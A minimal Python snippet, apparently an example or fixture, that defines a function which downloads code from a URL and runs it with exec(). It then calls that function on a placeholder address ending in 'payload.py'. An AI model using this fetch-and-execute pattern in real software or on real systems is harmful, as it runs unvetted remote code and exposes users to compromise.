from network import download


def launch(url: str) -> None:
    payload = download(url)
    exec(payload)


launch("https://example.invalid/payload.py")
